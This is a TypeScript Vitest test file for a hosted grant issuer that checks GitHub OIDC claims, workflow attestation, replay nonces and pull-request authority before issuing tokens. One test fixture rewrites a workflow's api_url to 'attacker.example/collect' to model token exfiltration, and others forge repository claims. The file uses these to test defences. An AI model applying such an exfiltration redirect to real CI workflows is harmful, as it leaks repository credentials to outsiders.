import { createHash } from "node:crypto";
import { describe, expect, it, vi } from "vitest";
import {
  createDefaultHostedAccountPool,
  enrollHostedPoolAccount,
  hostedAccountId,
  hostedBindingId,
  hostedPoolId,
  repositoryId,
  workspaceId,
} from "@reviewrouter/features-hosted-account-pool";
import {
  hostedPoolWorkflowSemanticSha256,
  hostedPoolWorkflowSchemaVersion,
  renderCanonicalHostedPoolWorkflowV2,
} from "@reviewrouter/features-workflow-provisioning";
import {
  HostedCodexGrantIssuer,
  assertHostedPoolPullRequestAuthority,
  type HostedPoolPullRequestAuthority,
  type HostedCodexGrantAdmission,
} from "./hosted-codex-grant-composition.js";

const now = new Date("2026-08-15T10:00:00.000Z");
const commitSha = "a".repeat(40);
const workflowPath = ".github/workflows/reviewrouter-hosted.yml";
const pullRequestNumber = 42;
const reviewHeadSha = "e".repeat(40);
const reviewRevisionHash = "f".repeat(64);
const pullRequestRef = `refs/pull/${pullRequestNumber}/merge`;
const workflowSource = `acme/private-repo/${workflowPath}@${pullRequestRef}`;
const workflowJobSource = `777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@${commitSha}`;
const workflow = renderCanonicalHostedPoolWorkflowV2({
  actionRef: `777genius/review-router@${commitSha}`,
  apiUrl: "https://api.reviewrouter.dev",
  providerInstanceId: "hosted-pool:repository:123",
  bindingId: "binding-1",
  bindingRevision: 7,
});

describe("HostedCodexGrantIssuer", () => {
  it("admits a realistic pull_request merge-ref caller bound to the admitted head", async () => {
    const fixture = createFixture();

    await expect(fixture.issuer.issue(request())).resolves.toMatchObject({
      repository: "acme/private-repo",
      runtimeConfigVersion: 19,
    });
    expect(fixture.replayNonces.tryConsumeNonce).toHaveBeenCalledOnce();
  });

  it("rejects the r44 same-repository PR caller that exfiltrates the hosted token", async () => {
    const exfiltratingCaller = workflow.replace(
      'api_url: "https://api.reviewrouter.dev"',
      'api_url: "https://attacker.example/collect"',
    );
    const fixture = createFixture({
      visibility: "public",
      workflowContents: exfiltratingCaller,
      workflowSourceBlobSha: "9".repeat(40),
    });

    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "hosted_workflow_attestation_blob_mismatch",
    );
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
    expect(fixture.commentTokens.issueInitial).not.toHaveBeenCalled();
  });

  it("rejects any caller byte mismatch even if blob evidence repeats the attested blob", async () => {
    const fixture = createFixture({
      workflowContents: `${workflow}# untrusted caller byte\n`,
    });

    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "hosted_workflow_attestation_digest_mismatch",
    );
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    expect(fixture.commentTokens.issueInitial).not.toHaveBeenCalled();
  });

  it("issues from server-derived exact authority and persists separate capabilities", async () => {
    const fixture = createFixture();

    await expect(fixture.issuer.issue(request())).resolves.toMatchObject({
      protocolVersion: 1,
      grant: "g".repeat(43),
      repository: "acme/private-repo",
      invocationLeaseId: expect.any(String),
      runtimeConfigVersion: 19,
      runtimeEnv: {
        REVIEW_PROVIDERS: "codex/gpt-5.5",
        REVIEW_AUTH_MODE: "codex_subscription_oauth_hosted_pool",
      },
      commentToken: "github-comment-token",
      commentTokenRefreshCapability: "r".repeat(43),
      policy: { maxRequests: 12, maxRequestBodyBytes: 2048 },
    });
    expect(fixture.replayNonces.tryConsumeNonce).toHaveBeenCalledOnce();
    expect(fixture.grantCapabilities.issue).toHaveBeenCalledOnce();
    expect(fixture.refreshCapabilities.issue).toHaveBeenCalledWith(
      expect.objectContaining({ maxUses: 4 }),
    );
    expect(fixture.insert).toHaveBeenCalledWith(
      expect.objectContaining({
        authority: expect.objectContaining({
          model: "gpt-5.5",
          reviewRequestId: "review-request-1",
          providerInvocationKey: "b".repeat(64),
          runtimeConfigVersion: 19,
          bindingRevision: 7,
          authzEpoch: 3n,
        }),
      }),
    );
  });

  it.each(["public", "private", "internal"] as const)(
    "issues a grant and requests initial publication authority for %s",
    async (visibility) => {
      const fixture = createFixture(
        { visibility },
        { repository_visibility: visibility },
      );
      await expect(fixture.issuer.issue(request())).resolves.toMatchObject({
        protocolVersion: 1,
      });
      expect(fixture.insert).toHaveBeenCalledOnce();
      expect(fixture.commentTokens.issueInitial).toHaveBeenCalledOnce();
    },
  );

  it.each([
    { selected: false },
    { installationStatus: "suspended" },
    { installationStatus: "deleted" },
    { githubRepositoryId: "999" },
    { repository: "other/repository" },
  ])(
    "public visibility preserves current repository authority: %j",
    async (authority) => {
      const fixture = createFixture({ visibility: "public", ...authority });
      await expect(fixture.issuer.issue(request())).rejects.toThrow();
      expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
      expect(fixture.insert).not.toHaveBeenCalled();
      expect(fixture.commentTokens.issueInitial).not.toHaveBeenCalled();
    },
  );

  it("rejects unknown visibility before consuming replay state or issuing grants", async () => {
    const fixture = createFixture({ visibility: "unknown" as never });
    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "hosted_repository_visibility_ineligible",
    );
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
  });

  it("rejects stale client binding revisions before consuming OIDC", async () => {
    const fixture = createFixture({ visibility: "public" });
    await expect(
      fixture.issuer.issue({ ...request(), bindingVersion: 6 }),
    ).rejects.toThrow("hosted_grant_binding_mismatch");
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
  });

  it("rejects pull_request_target claims before consuming OIDC", async () => {
    const fixture = createFixture(
      { visibility: "public" },
      { event_name: "pull_request_target" },
    );
    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "hosted_workflow_claims_mismatch",
    );
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
  });

  it.each([
    ["mismatched PR ref", { ref: "refs/pull/41/merge" }],
    ["missing PR ref", { ref: undefined }],
    ["PR head ref", { ref: "refs/pull/42/head" }],
    [
      "mismatched caller workflow PR identity",
      {
        workflow_ref: `acme/private-repo/${workflowPath}@refs/pull/41/merge`,
      },
    ],
    [
      "default-branch caller fallback",
      { workflow_ref: `acme/private-repo/${workflowPath}@refs/heads/main` },
    ],
    ["mismatched caller SHA", { workflow_sha: "b".repeat(40) }],
    ["uppercase caller SHA", { workflow_sha: "E".repeat(40) }],
    ["missing caller SHA", { workflow_sha: undefined }],
    [
      "mismatched caller repository",
      {
        workflow_ref: `evil/private-repo/${workflowPath}@${pullRequestRef}`,
      },
    ],
    ["mismatched repository claim", { repository: "evil/private-repo" }],
    ["mismatched repository id", { repository_id: "124" }],
    ["mismatched repository owner", { repository_owner: "evil" }],
    [
      "mismatched subject repository",
      { sub: "repo:evil/private-repo:pull_request" },
    ],
    [
      "mismatched subject event",
      { sub: "repo:acme/private-repo:environment:prod" },
    ],
  ] as const)("rejects %s before consuming OIDC", async (_name, override) => {
    const fixture = createFixture({}, override);
    await expect(fixture.issuer.issue(request())).rejects.toThrow();
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
  });

  it.each([
    ["admitted PR number", { pullRequestNumber: 41 }],
    ["admitted head SHA", { reviewHeadSha: "b".repeat(40) }],
  ] as const)("rejects a mismatched %s", async (_name, admissionOverride) => {
    const fixture = createFixture(admissionOverride);
    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "hosted_workflow_claims_mismatch",
    );
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
  });

  it.each([
    undefined,
    `777genius/review-router/.github/workflows/reviewrouter-execution-reusable.yml@${commitSha}`,
    `evil/review-router/.github/workflows/reviewrouter-t0-reusable.yml@${commitSha}`,
    "777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@refs/heads/main",
  ])("rejects non-exact hosted execution source %s", async (jobWorkflowRef) => {
    const fixture = createFixture({}, { job_workflow_ref: jobWorkflowRef });
    await expect(fixture.issuer.issue(request())).rejects.toThrow();
    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
  });

  it.each([undefined, "b".repeat(40)])(
    "rejects missing or mismatched hosted execution SHA %s",
    async (jobWorkflowSha) => {
      const fixture = createFixture({}, { job_workflow_sha: jobWorkflowSha });
      await expect(fixture.issuer.issue(request())).rejects.toThrow(
        "hosted_workflow_claims_mismatch",
      );
      expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
    },
  );

  it("recovers a response-loss retry only after consuming a fresh OIDC jti", async () => {
    const fixture = createFixture();
    const first = await fixture.issuer.issue(request());
    const retry = await fixture.issuer.issue(request());

    expect(retry.grant).toBe(first.grant);
    expect(retry.commentTokenRefreshCapability).toBe(
      first.commentTokenRefreshCapability,
    );
    expect(retry.invocationLeaseId).toBe(first.invocationLeaseId);
    expect(fixture.insert).toHaveBeenCalledOnce();
    expect(fixture.commentTokens.issueInitial).toHaveBeenCalledTimes(2);
    expect(fixture.replayNonces.tryConsumeNonce).toHaveBeenCalledTimes(2);
  });

  it("does not let existing-grant recovery bypass one-time OIDC consumption", async () => {
    const fixture = createFixture();
    fixture.replayNonces.tryConsumeNonce
      .mockResolvedValueOnce(true)
      .mockResolvedValueOnce(false);
    await fixture.issuer.issue(request());

    await expect(fixture.issuer.issue(request())).rejects.toThrow(
      "oidc_replay_detected",
    );
    expect(fixture.commentTokens.issueInitial).toHaveBeenCalledOnce();
  });
});

function createFixture(
  overrides: Partial<HostedCodexGrantAdmission> = {},
  claimOverrides: Omit<
    {
      [K in keyof ReturnType<typeof claims>]?:
        | ReturnType<typeof claims>[K]
        | undefined;
    },
    "event_name"
  > & {
    readonly event_name?: "pull_request" | "pull_request_target";
  } = {},
) {
  const admission: HostedCodexGrantAdmission = {
    workspaceId: "workspace-1",
    repositoryId: "repository-1",
    githubRepositoryId: "123",
    githubInstallationId: "456",
    repository: "acme/private-repo",
    owner: "acme",
    selected: true,
    visibility: "private",
    installationStatus: "active",
    bindingId: "binding-1",
    bindingRevision: 7,
    authzEpoch: 3n,
    runtimeAuthzEpoch: 5n,
    workflowSchemaVersion: hostedPoolWorkflowSchemaVersion,
    workflowSource,
    workflowJobSource,
    workflowJobSha: commitSha,
    pullRequestNumber,
    reviewHeadSha,
    reviewRevisionHash,
    workflowAttestation: {
      repositoryId: "123",
      workflowPath,
      workflowSourceCommitSha: commitSha,
      workflowSourceBlobSha: "c".repeat(40),
      workflowSourceSha256: digest(workflow),
      workflowSemanticSha256: hostedPoolWorkflowSemanticSha256(workflow),
      sourceTrust: "trusted_default_branch_revision",
      bindingId: "binding-1",
      bindingRevision: 7,
    },
    workflowPath,
    workflowSourceCommitSha: reviewHeadSha,
    workflowSourceBlobSha: "c".repeat(40),
    workflowContents: workflow,
    reviewRequestId: "review-request-1",
    providerInvocationKey: "b".repeat(64),
    runtimeConfigVersion: 19,
    runtimeEnv: {
      REVIEW_PROVIDERS: "codex/gpt-5.5",
      REVIEW_AUTH_MODE: "codex_subscription_oauth_hosted_pool",
    },
    model: "gpt-5.5",
    policyFingerprint: "d".repeat(64),
    ...overrides,
  };
  const pool = createDefaultHostedAccountPool({
    id: hostedPoolId("pool-1"),
    workspaceId: workspaceId("workspace-1"),
    now,
  });
  const account = enrollHostedPoolAccount({
    id: hostedAccountId("account-1"),
    poolId: pool.id,
    label: "Primary",
    priority: 1,
    credential: {
      credentialRef: "credential:1",
      subjectFingerprint: "fingerprint-1",
      authGeneration: 1,
      validatedAt: now,
      expiresAt: null,
    },
    now,
  });
  let persistedGrant: unknown = null;
  const insert = vi.fn().mockImplementation(async (grant) => {
    persistedGrant = grant;
  });
  const replayNonces = { tryConsumeNonce: vi.fn().mockResolvedValue(true) };
  const grantCapabilities = {
    issue: vi.fn().mockResolvedValue({
      plaintextToken: "g".repeat(43),
      tokenHash: "1".repeat(64),
    }),
  };
  const refreshCapabilities = {
    issue: vi.fn().mockResolvedValue({
      plaintextToken: "r".repeat(43),
      tokenHash: "2".repeat(64),
    }),
    consume: vi.fn(),
    revoke: vi.fn(),
  };
  const commentTokens = {
    issueInitial: vi.fn().mockResolvedValue({
      token: "github-comment-token",
      expiresAt: new Date("2026-08-15T10:45:00.000Z"),
      repository: "acme/private-repo",
      permissions: {
        contents: "read",
        pullRequests: "write",
        issues: "write",
        statuses: "write",
      },
    }),
  };
  const issuer = new HostedCodexGrantIssuer({
    oidcVerifier: {
      verify: vi.fn().mockResolvedValue({ ...claims(), ...claimOverrides }),
    },
    replayNonces,
    admissions: { resolve: vi.fn().mockResolvedValue(admission) },
    pools: {
      findById: vi.fn().mockResolvedValue(pool),
      findDefaultByWorkspaceId: vi.fn(),
      insertDefault: vi.fn(),
      advanceRevision: vi.fn(),
    },
    bindings: {
      findByRepositoryId: vi.fn().mockResolvedValue({
        bindingId: hostedBindingId("binding-1"),
        repositoryId: repositoryId("repository-1"),
        workspaceId: workspaceId("workspace-1"),
        poolId: pool.id,
        authMode: "codex_subscription_oauth_hosted_pool",
        status: "active",
        revision: 7,
        boundAt: now,
        updatedAt: now,
      }),
      save: vi.fn(),
    },
    accounts: {
      listByPoolId: vi.fn().mockResolvedValue([account]),
      findById: vi.fn(),
      findBySubjectFingerprint: vi.fn(),
      replaceCredential: vi.fn(),
      saveAvailability: vi.fn(),
    },
    grants: {
      findByInvocationId: vi
        .fn()
        .mockImplementation(async () => persistedGrant),
      insert,
      mutate: vi.fn(),
    },
    grantCapabilities,
    refreshCapabilities,
    commentTokens,
    clock: { now: () => now },
    relayUrl:
      "https://api.reviewrouter.dev/api/action/v1/hosted-codex/responses",
    policy: {
      ttlMs: 15 * 60_000,
      maxRequests: 12,
      maxConcurrentRequests: 2,
      maxRequestBodyBytes: 2048,
      maxResponseBytes: 8192,
      maxOutputTokens: 4096,
      maxCommentTokenRefreshes: 4,
    },
  });
  return {
    issuer,
    replayNonces,
    grantCapabilities,
    refreshCapabilities,
    insert,
    commentTokens,
  };
}

function request() {
  return {
    oidcToken: "oidc-token".repeat(4),
    providerInstanceId: "hosted-pool:repository:123",
    workflowSchemaVersion: hostedPoolWorkflowSchemaVersion,
    bindingId: "binding-1",
    bindingVersion: 7,
  };
}

function claims() {
  return {
    iss: "https://token.actions.githubusercontent.com" as const,
    aud: "reviewrouter",
    sub: "repo:acme/private-repo:pull_request",
    repository: "acme/private-repo",
    repository_id: "123",
    repository_owner: "acme",
    repository_visibility: "private",
    event_name: "pull_request" as const,
    ref: pullRequestRef,
    run_id: "9001",
    run_attempt: "2",
    workflow_ref: workflowSource,
    workflow_sha: reviewHeadSha,
    job_workflow_ref: workflowJobSource,
    job_workflow_sha: commitSha,
    actor: "octocat",
    jti: "oidc-jti-1",
    exp: Math.floor(new Date("2026-08-15T10:10:00.000Z").getTime() / 1000),
  };
}

function digest(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

describe("server-observed Hosted pull request authority", () => {
  const admitted = {
    githubRepositoryId: "123",
    pullRequestNumber: 42,
    reviewHeadSha,
  };
  const observed: HostedPoolPullRequestAuthority = {
    number: 42,
    state: "open",
    baseRepositoryId: "123",
    headRepositoryId: "123",
    headSha: reviewHeadSha,
  };

  it("accepts the exact same-repository admitted head", () => {
    expect(() =>
      assertHostedPoolPullRequestAuthority({
        ...admitted,
        pullRequest: observed,
      }),
    ).not.toThrow();
  });

  it.each([
    ["external fork", { headRepositoryId: "999" }],
    ["deleted head repository", { headRepositoryId: null }],
    ["wrong base repository", { baseRepositoryId: "999" }],
    ["wrong PR", { number: 43 }],
    ["closed PR", { state: "closed" }],
    ["head advanced", { headSha: "9".repeat(40) }],
    ["missing head", { headSha: "" }],
  ] as const)("denies %s even with a forged client check", (_label, patch) => {
    // Extra client-supplied flags are deliberately not part of server authority.
    const forgedRequest = { sameRepository: true, fork: false };
    expect(() =>
      assertHostedPoolPullRequestAuthority({
        ...forgedRequest,
        ...admitted,
        pullRequest: { ...observed, ...patch },
      }),
    ).toThrow("hosted_pull_request_authority_mismatch");
  });
});
